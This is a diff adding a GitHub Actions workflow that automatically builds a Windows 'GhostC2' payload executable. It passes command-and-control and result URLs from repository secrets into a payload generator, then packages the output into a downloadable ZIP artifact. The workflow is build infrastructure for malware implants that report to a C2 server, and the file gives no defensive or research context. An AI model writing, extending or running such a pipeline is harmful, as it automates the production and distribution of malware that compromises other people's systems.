@@ -1,0 +1,69 @@
+name: Build GhostC2 Payloads
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:  # allow manual runs
+
+jobs:
+  build-windows-payload:
+    name: Build on Windows
+    runs-on: windows-latest
+
+    env:
+      C2_URL: ${{ secrets.GHOST_C2_URL }}
+      RESULT_URL: ${{ secrets.GHOST_RESULT_URL }}
+
+    steps:
+      - name: Checkout Repo
+        uses: actions/checkout@v3
+
+      - name: Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: 3.11
+
+      - name: Install Requirements
+        run: |
+          pip install pyinstaller requests pycryptodome
+
+      - name: Generate Payload
+        run: |
+          cd tools
+          python generate_payload.py --c2 "%C2_URL%" --result "%RESULT_URL%" --exe
+
+      - name: Rename Output for Clarity
+        run: |
+          cd tools/builds
+          for /f %%f in ('dir /b *.exe') do ren "%%f" "ghost_payload_windows.exe"
+
+      - name: Upload Windows Payload
+        uses: actions/upload-artifact@v3
+        with:
+          name: ghost_payload_windows
+          path: tools/builds/ghost_payload_windows.exe
+
+  build-zip-archive:
+    name: Zip Payload Archive
+    runs-on: ubuntu-latest
+    needs: build-windows-payload
+
+    steps:
+      - name: Checkout Repo
+        uses: actions/checkout@v3
+
+      - name: Download Payload Artifact
+        uses: actions/download-artifact@v3
+        with:
+          name: ghost_payload_windows
+
+      - name: Compress into ZIP
+        run: |
+          zip ghost_payload_package.zip ghost_payload_windows.exe
+
+      - name: Upload Final Archive
+        uses: actions/upload-artifact@v3
+        with:
+          name: ghost_payload_package
+          path: ghost_payload_package.zip
